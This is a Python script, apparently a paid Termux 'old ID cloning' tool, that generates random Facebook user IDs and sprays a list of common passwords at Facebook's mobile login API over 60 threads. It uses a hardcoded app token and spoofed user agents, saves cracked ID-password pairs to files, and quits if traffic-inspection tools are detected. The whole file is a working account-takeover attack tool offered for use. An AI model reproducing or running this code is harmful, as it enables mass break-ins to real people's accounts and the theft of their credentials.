import os
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred, as_completed
import threading
from os import system
from datetime import datetime

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


def clear_screen():
    os.system('cls' if 'win' in sys.platform else 'clear')


clear_screen()

# ============================================================
# CYBER BLUE COLOR THEME
# ============================================================
R      = "\033[0m"
B      = "\033[1m"
CB1    = "\033[38;5;51m"    # Bright Cyan  (primary)
CB2    = "\033[38;5;45m"    # Deep Cyan    (secondary)
CB3    = "\033[38;5;39m"    # Steel Blue   (accent)
CB4    = "\033[38;5;27m"    # Dark Blue    (border)
WHITE  = "\033[38;5;255m"   # Pure White
GRAY   = "\033[38;5;245m"   # Gray
GREEN  = "\033[38;5;46m"    # Hit green (unchanged)
RED    = "\033[38;5;196m"   # Error red
GOLD   = "\033[38;5;220m"   # Gold highlight

# Legacy color aliases (login functions use these)
PURPLE = CB4
PINK   = CB1
CYAN   = CB1
BLUE   = CB2
X      = '\x1b[1;37m'
rad    = '\x1b[38;5;196m'
G      = '\x1b[38;5;46m'
Y      = CB1
PP     = CB2
RR     = '\x1b[38;5;196m'
GS     = '\x1b[38;5;40m'
W      = '\x1b[1;37m'

# ============================================================
# GITHUB APPROVAL SYSTEM
# ============================================================
def max_approval():
    clear_screen()
    uuid_raw = str(os.getlogin()) + str(os.getuid())
    key = hashlib.md5(uuid_raw.encode()).hexdigest().upper()[:12]
    github_link = "https://github.com/RAJA-CYBER420/Open-/blob/main/aprovel-73"

    print(f"""
{CB4}╔════════════════════════════════════════════════╗
{CB4}║ {CB1}               𓆩 M.A.X 𓆪                  {CB4}     ║
{CB4}║ {CB2}             APPROVAL SYSTEM                {CB4}   ║
{CB4}╠════════════════════════════════════════════════╣
{CB4}║ {GOLD}              ⚡ PREMIUM ACCESS ⚡            {CB4} ║
{CB4}╚════════════════════════════════════════════════╝
{R}""")

    print(f"{CB1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{WHITE}{B} YOUR KEY {GRAY}➜ {CB1}{B}MAX-{key}{R}")
    print(f"{CB1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{GOLD}{B}              💎 TOOL PRICES{R}")
    print(f"{CB4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{CB1}[01] {WHITE}7 Dollars   {CB4}➜ {GREEN}7 Days{R}")
    print(f"{CB2}[02] {WHITE}14 Dollars  {CB4}➜ {GREEN}15 Days{R}")
    print(f"{CB3}[03] {WHITE}28 Dollars  {CB4}➜ {GREEN}30 Days{R}")
    print(f"{CB4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{CB1} ⚡ STATUS {WHITE}➜ {GOLD}Checking Approval...{R}")

    try:
        response = requests.get(github_link, timeout=10).text
        if f"MAX-{key}" in response:
            print(f"""
{GREEN}╔════════════════════════════════════════════════╗
{GREEN}║ {WHITE}             ✓ ACCESS GRANTED               {GREEN}   ║
{GREEN}║ {CB1}          Welcome To MAX TOOL  ⚡            {GREEN}  ║
{GREEN}╚════════════════════════════════════════════════╝
{R}""")
            time.sleep(2)
        else:
            print(f"""
{RED}╔════════════════════════════════════════════════╗
{RED}║ {WHITE}             ✗ ACCESS DENIED                {RED}   ║
{RED}║ {GOLD}       Key Is Not Approved Yet              {RED}   ║
{RED}╚════════════════════════════════════════════════╝
{R}""")
            os.system(f'xdg-open "https://wa.me/+923229120975?text=Mera-Key-Approve-Kardo-MAX-{key}"')
            sys.exit()
    except requests.RequestException:
        print(f"\n{RED}[!] {WHITE}Approval server connection failed.{R}")
        sys.exit()


####max_approval()
###try:
###    api_body = open(api.__file__, 'r').read()
###    models_body = open(models.__file__, 'r').read()
###    session_body = open(sessions.__file__, 'r').read()
###    word_list = ['print', 'lambda', 'zlib.decompress']
###    for word in word_list:
###        if word in api_body or word in models_body or word in session_body:
####            exit()
###except:
###    pass


class sec:
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            try:
                if 'print' in open(path, 'r').read():
                    self.fuck()
            except:
                pass
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print(f'{CB1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# ============================================================
# GLOBAL VARIABLES
# ============================================================
method     = []
oks        = []
cps        = []
loop       = 0
user       = []
start_time = time.time()
print_lock = threading.Lock()


# ============================================================
# LOADING SPINNER — CYBER SCAN (OPTION 3)
# ============================================================
def cyber_spinner():
    clear_screen()
    W_ = 44  # box inner width (fixed)

    steps = [
        (CB2,  "INITIALIZING SYSTEM...  ",  0),
        (CB3,  "LOADING MODULES...      ", 25),
        (CB1,  "BYPASSING SECURITY...   ", 50),
        (CB2,  "ESTABLISHING LINK...    ", 75),
        (GREEN,"SYSTEM ONLINE           ",100),
    ]

    def bar_str(pct, width=24):
        filled = int(width * pct / 100)
        empty  = width - filled
        return f"{CB1}{'█' * filled}{GRAY}{'░' * empty}{R}"

    for color, label, pct in steps:
        clear_screen()
        bar = bar_str(pct)
        pct_str = f"{pct}%"

        print(f"\n{CB4}  ╔{'═' * W_}╗")
        print(f"{CB4}  ║{CB1}{'  INITIALIZING SYSTEM...'.center(W_)}{CB4}║")
        print(f"{CB4}  ║{' ' * W_}║")
        print(f"{CB4}  ║  {bar}  {CB1}{pct_str:<4}{CB4}            ║")
        print(f"{CB4}  ║{' ' * W_}║")
        print(f"{CB4}  ║  {color}> {label}{CB4}{' ' * (W_ - len(label) - 4)}║")
        print(f"{CB4}  ╚{'═' * W_}╝{R}\n")
        time.sleep(0.6)

    time.sleep(0.3)
    clear_screen()

    done_lines = [
        f"  {GREEN}✓ SYSTEM ONLINE         ",
        f"  {CB1}✓ MODULES LOADED        ",
        f"  {CB2}✓ CONNECTION ESTABLISHED",
    ]

    print(f"\n{CB4}  ╔{'═' * W_}╗")
    for line in done_lines:
        visible = line.replace(GREEN,'').replace(CB1,'').replace(CB2,'')
        pad = W_ - len(visible)
        print(f"{CB4}  ║{line}{R}{' ' * pad}{CB4}║")
    print(f"{CB4}  ╚{'═' * W_}╝{R}\n")
    time.sleep(1.2)


# ============================================================
# BANNER
# ============================================================
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')

    print(f"""
{CB1}        ▄█▀██▀█▄  ██▀▀▀██        ██   ██  {R}
{CB2}      █ ██ ██ ██  ██ █ ██ █    █ ██ █ ██ █{R}
{CB2}      █ ██ ██ ██  ██ █ ██ █    █ ██ █ ██ █{R}
{CB3}      █ ██ ██ ██  ██ ▀ ██ █    █ ██ ▀ ██ █{R}
{CB3}      █ ██ ██ ██  ██████  █    █  ▐███▌  █{R}
{CB2}      █ ██ ██ ██  ██ ▄ ██ █    █ ██ ▄ ██ █{R}
{CB2}      █ ██ ██ ██  ██ █ ██ █    █ ██ █ ██ █{R}
{CB1}      █ ██ ██ ██  ██ █ ██ █    █ ██ █ ██ █{R}
{CB1}      ▀ ██ ██ ██  ██ ▀ ██ ▀    ▀ ██ ▀ ██ ▀{R}

{CB4}══════════════════════════════════════════════════{R}
{CB1}║  👑 OWNER   : {WHITE}SHAHARIAR ZAMAN{R}
{CB2}║  ⚡ TOOLS   : {WHITE}MAX OLD ID CLONING{R}
{CB3}║  ✦ VERSION  : {WHITE}SUPER VIP{R}
{CB4}══════════════════════════════════════════════════{R}
""")

# ============================================================
# SAVE RESULT / HELPERS / CP OUTPUT
# ============================================================
def clear_line():
    sys.stdout.write("\x1b[2K\r")
    sys.stdout.flush()


def has_storage_permission():
    """
    Termux-এ /sdcard/ এ লেখার permission আছে কিনা চেক করে।
    """
    test_path = '/sdcard/.max_write_test'
    try:
        with open(test_path, 'w') as f:
            f.write('test')
        os.remove(test_path)
        return True
    except (PermissionError, FileNotFoundError, OSError):
        return False


def get_save_path(filename):
    """
    permission থাকলে /sdcard/, না থাকলে script folder।
    """
    if has_storage_permission():
        return '/sdcard/' + filename
    else:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        return os.path.join(script_dir, filename)


def save_result(filename, uid, pw):
    path = get_save_path(filename)
    try:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(f"{uid}|{pw}\n")
    except Exception:
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"{uid}|{pw}\n")
        except Exception:
            pass


def err_message(res):
    err = res.get('error', {}) if isinstance(res, dict) else {}
    if isinstance(err, dict):
        return str(err.get('message', ''))
    return str(err)


def is_checkpoint(res):
    if not isinstance(res, dict):
        return False
    err = res.get('error', {})
    if isinstance(err, dict) and str(err.get('code', '')) == '405':
        return True
    try:
        blob = json.dumps(res).lower()
    except Exception:
        return False
    return 'checkpoint' in blob or 'please go to the first' in blob

# ============================================================
# [4] PROGRESS BAR (UNCHANGED)
# ============================================================
def progress_bar(current, total, width=24):
    pct    = current / max(total, 1)
    filled = int(width * pct)
    bar    = f"{CB1}{'█' * filled}{GRAY}{'░' * (width - filled)}{R}"
    return f"{bar} {GOLD}{pct*100:.1f}%{R}"




# ============================================================
# UTILITY
# ============================================================
def linex():
    print(f'{CB1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}')


def windows():
    aV = str(random.choice(range(10, 20)))
    A  = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B  = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C  = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D  = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def windows1():
    aV = str(random.choice(range(10, 20)))
    A  = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6,11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80,122))}.0.{random.choice(range(4000,7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B  = f"Mozilla/5.0 (Windows NT {random.choice(range(6,11))}.{random.choice(['0','1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80,122))}.0.{random.choice(range(4000,7000))}.{random.choice(range(50,200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C  = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0','1','2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80,122))}.0.{random.choice(range(4000,7000))}.{random.choice(range(50,200))} Safari/{cz}"
    lb = rr(6000, 9000)
    lp = rr(100, 200)
    D  = f"Mozilla/5.0 (Windows NT {random.choice(['10.0','11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{lb}.{lp} Safari/537.36"
    return random.choice([A, B, C, D])


try:
    sys.stdout.write('\x1b]2;𓆩【M A X  T O O L】𓆪 \x07')
    sys.stdout.flush()
except Exception:
    pass


def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'):  return '2009'
        if uid.startswith('10000000'):   return '2009'
        if uid.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')): return '2009'
        if uid.startswith(('1000006','1000007','1000008','1000009')): return '2010'
        if uid.startswith('100001'):  return '2010'
        if uid.startswith(('100002','100003')): return '2011'
        if uid.startswith('100004'):  return '2012'
        if uid.startswith(('100005','100006')): return '2013'
        if uid.startswith(('100007','100008')): return '2014'
        if uid.startswith('100009'):  return '2015'
        if uid.startswith('10001'):   return '2016'
        if uid.startswith('10002'):   return '2017'
        if uid.startswith('10003'):   return '2018'
        if uid.startswith('10004'):   return '2019'
        if uid.startswith('10005'):   return '2020'
        if uid.startswith('10006'):   return '2021'
        if uid.startswith('10009'):   return '2023'
        if uid.startswith(('10007','10008')): return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8:       return '2007'
    elif len(uid) == 7:       return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''


# ============================================================
# SIDE PANEL MENU HELPER
# ============================================================
def side_menu(title, options):
    """
    options = list of strings
    returns: user's choice string (stripped, upper)
    কমান্ড: 1 / 2 / 3 ... অথবা A / B / C ...
    """
    W_ = 30
    print(f"\n{CB4}  ┌─ {CB1}{title} {CB4}{'─' * max(0, W_ - len(title) - 2)}┐")
    for idx, opt in enumerate(options, 1):
        pad = W_ - len(opt) - 5
        print(f"{CB4}  │  {CB2}{idx}. {WHITE}{opt}{' ' * pad}{CB4} │")
    print(f"{CB4}  └{'─' * (W_ + 1)}┘{R}")
    linex()
    choice = input(f"  {CB1}CHOICE {WHITE}» {GOLD}").strip().upper()
    return choice


def parse_choice(choice, n):
    """
    1/2/3 অথবা A/B/C দুটোই accept করে।
    n = মোট অপশন সংখ্যা
    returns: 1-indexed int অথবা None
    """
    if choice.isdigit():
        v = int(choice)
        return v if 1 <= v <= n else None
    letter_map = {chr(64+i): i for i in range(1, n+1)}
    return letter_map.get(choice, None)


# ============================================================
# MAIN MENU
# ============================================================
def MAX():
    ____banner____()
    c = side_menu("MAIN MENU", ["OLD CLONE"])
    v = parse_choice(c, 1)
    if v == 1:
        old_clone()
    else:
        print(f"\n  {RED}[!] Invalid option.{R}")
        time.sleep(1.5)
        MAX()


def old_clone():
    ____banner____()
    c = side_menu("SELECT SERIES", [
        "ALL SERIES",
        "100003/4 SERIES",
        "2009 SERIES",
    ])
    v = parse_choice(c, 3)
    if v == 1:
        old_One()
    elif v == 2:
        old_Tow()
    elif v == 3:
        old_Tree()
    else:
        print(f"\n  {RED}[!] Invalid option.{R}")
        time.sleep(1.5)
        MAX()
# ============================================================
# [5] FINAL REPORT (UNCHANGED)
# ============================================================
def final_report(total_checked, total_hit, total_cp, elapsed, method_num):
    avg_speed = total_checked / max(elapsed, 1)
    minutes   = int(elapsed // 60)
    seconds   = int(elapsed % 60)
    with print_lock:
        clear_line()
        print(f"""
{CB4}╔══════════════════════════════════════════╗
{CB4}║         {CYAN}✦ {GREEN}SESSION COMPLETE {CYAN}✦             {CB4}║
{CB4}╚══════════════════════════════════════════╝
      {WHITE}TOTAL CHECKED {CB4}: {GOLD}{total_checked:<12}
      {WHITE}TOTAL ID      {CB4}: {GOLD}{total_cp:<12}
      {WHITE}METHOD        {CB4}: {RED}{method_num}
      {WHITE}TIME ELAPSED  {CB4}: {GOLD}{minutes}m {seconds}s
      {WHITE}AVG SPEED     {CB4}: {GOLD}{avg_speed:.1f} ID/s


{GREEN}╔══════════════════════════════════════════╗
{GREEN}║ {CYAN}THANK YOU VERY MUCH FOR USING OUR TOOLS  {GREEN}║
{GREEN}╚══════════════════════════════════════════╝
""")

# ============================================================
# CLONING METHODS
# ============================================================
def _run_pool(user_list, meth, total):
    global start_time
    start_time = time.time()
    worker = login_1 if meth == 'A' else login_2 if meth == 'B' else None
    done = 0
    with tred(max_workers=60) as pool:
        ____banner____()
        print(f"  {CB1}TOTAL IDs  {WHITE}: {GOLD}{total}{R}")
        print(f"  {CB2}TIPS       {WHITE}: USE AIRPLANE MODE FOR BEST RESULT{R}")
        linex()
        if worker is None:
            print(f"\n  {RED}[!] INVALID METHOD{R}")
        else:
            futures = [pool.submit(worker, uid) for uid in user_list]
            for fut in as_completed(futures):
                done += 1
                elapsed = max(time.time() - start_time, 0.001)
                speed = done / elapsed
                bar = progress_bar(done, total)
                with print_lock:
                    sys.stdout.write(f"\r{bar}{CB1}[{done}]{R} {GOLD}OK {WHITE}: {GREEN}{len(cps):<4}\x1b[K")
                    sys.stdout.flush()
    elapsed = time.time() - start_time
    final_report(total, len(oks), len(cps), elapsed, meth)
# ============================================================
# [2] HIT OUTPUT — CLEAN FORMAT (UNCHANGED)
# ============================================================
def print_hit(uid, pw, year, method_num):
    with print_lock:
        clear_line()
        print(f"""
{GREEN}╔══════════════════════════════════════╗
{GREEN}║          {WHITE}✓ {RED}HIT FOUND                 {GREEN}║
{GREEN}╚══════════════════════════════════════╝
     {WHITE}UID    {GREEN}: {CB3}{uid}
     {WHITE}PASS   {GREEN}: {CYAN}{pw}
     {WHITE}YEAR   {GREEN}: {GOLD}{year}
     {WHITE}METHOD {GREEN}: {RED}M{method_num}
""")
def print_cp(uid, pw, year, method_num):
    e = '═' * 38
    with print_lock:
        clear_line()
        print(f"""
{GREEN}╔══════════════════════════════════════╗
{GREEN}║          {WHITE}✓ {RED}HIT FOUND                 {GREEN}║
{GREEN}╚══════════════════════════════════════╝
     {WHITE}UID    {GREEN}: {CB3}{uid}
     {WHITE}PASS   {GREEN}: {CYAN}{pw}
     {WHITE}YEAR   {GREEN}: {GOLD}{year}
     {WHITE}METHOD {GREEN}: {RED}M{method_num}
""")


# ============================================================

def old_One():
    global start_time
    uids = []
    ____banner____()
    print(f"  {CB1}OLD CODE {WHITE}: {GOLD}2010-2014 {GREEN}[{WHITE}Type {RED}5 {WHITE}or {RED}6 {WHITE}Here {CB3}ONLY{GREEN}]{R}")
    linex()
    ask = input(f"  {CB2}SELECT {WHITE}» {GOLD}")
    linex()
    ____banner____()
    print(f"  {CB1}EXAMPLE  {WHITE}: {GOLD}20000 / 30000 / 99999{R}")
    limit = input(f"  {CB2}TOTAL ID COUNT {WHITE}» {GOLD}")
    linex()
    total = int(limit)
    star  = '10000'
    for _ in range(total):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        uids.append(star + data)
    c = side_menu("SELECT METHOD", ["METHOD 1", "METHOD 2"])
    v = parse_choice(c, 2)
    meth = 'A' if v == 1 else 'B' if v == 2 else 'A'
    _run_pool(uids, meth, total)


def old_Tow():
    uids = []
    ____banner____()
    print(f"  {CB1}OLD CODE {WHITE}: {GOLD}2010-2014 (100003/4 PREFIX){R}")
    linex()
    ask   = input(f"  {CB2}SELECT {WHITE}» {GOLD}")
    linex()
    ____banner____()
    print(f"  {CB1}EXAMPLE  {WHITE}: {GOLD}20000 / 30000 / 99999{R}")
    limit = input(f"  {CB2}TOTAL ID COUNT {WHITE}» {GOLD}")
    linex()
    total    = int(limit)
    prefixes = ['100003', '100004']
    for _ in range(total):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uids.append(prefix + suffix)
    c = side_menu("SELECT METHOD", ["METHOD A", "METHOD B"])
    v = parse_choice(c, 2)
    meth = 'A' if v == 1 else 'B' if v == 2 else 'A'
    _run_pool(uids, meth, total)


def old_Tree():
    uids = []
    ____banner____()
    print(f"  {CB1}OLD CODE {WHITE}: {GOLD}2009-2010{R}")
    linex()
    ask   = input(f"  {CB2}SELECT {WHITE}» {GOLD}")
    linex()
    ____banner____()
    print(f"  {CB1}EXAMPLE  {WHITE}: {GOLD}20000 / 30000 / 99999{R}")
    limit = input(f"  {CB2}TOTAL ID COUNT {WHITE}» {GOLD}")
    linex()
    total  = int(limit)
    prefix = '1000004'
    for _ in range(total):
        suffix = ''.join(random.choices('0123456789', k=8))
        uids.append(prefix + suffix)
    c = side_menu("SELECT METHOD", ["METHOD A", "METHOD B"])
    v = parse_choice(c, 2)
    meth = 'A' if v == 1 else 'B' if v == 2 else 'A'
    _run_pool(uids, meth, total)

# ============================================================
# LOGIN FUNCTIONS (CORE — UNCHANGED)
# ============================================================
def login_1(uid):
    global loop
    session = requests.session()
    try:
        for pw in ('123456','1234567','12345678','123456789','112233','123123',
                   '1234567890','abcde','abcabc','abcdabcd','abcdefgh',
                   'abcde','54321','654321','987654321'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': windows1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=headers, allow_redirects=False, timeout=30
            ).json()
            if 'session_key' in res:
                year = creationyear(uid)
                print_hit(uid, pw, year, 1)
                save_result('MAX-OLD-M1-OK.txt', uid, pw)
                oks.append(uid)
                break
            elif 'www.facebook.com' in err_message(res):
                year = creationyear(uid)
                print_hit(uid, pw, year, 1)
                save_result('MAX-OLD-M1-OK.txt', uid, pw)
                oks.append(uid)
                break
            elif is_checkpoint(res):
                year = creationyear(uid)
                print_cp(uid, pw, year, 1)
                save_result('MAX-OLD-M1-OK.txt', uid, pw,)
                cps.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    global loop
    session = requests.session()
    try:
        for pw in ('123456','1234567','12345678','123456789','112233','123123',
                   '1234567890','abcde','abcabc','abcdabcd','abcdefgh',
                   'abcde','54321','654321','987654321'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': windows(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=headers, allow_redirects=False, timeout=30
            ).json()
            if 'session_key' in res:
                year = creationyear(uid)
                print_hit(uid, pw, year, 2)
                save_result('MAX-OLD-M2-OK.txt', uid, pw,)
                oks.append(uid)
                break
            elif 'www.facebook.com' in err_message(res):
                year = creationyear(uid)
                print_hit(uid, pw, year, 2)
                save_result('MAX-OLD-M2-OK.txt', uid, pw)
                oks.append(uid)
                break
            elif is_checkpoint(res):
                year = creationyear(uid)
                print_cp(uid, pw, year, 2)
                save_result('MAX-OLD-M2-OK.txt', uid, pw)
                cps.append(uid)
                break
    except Exception:
        pass
    loop += 1


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == '__main__':
    cyber_spinner()
    MAX()
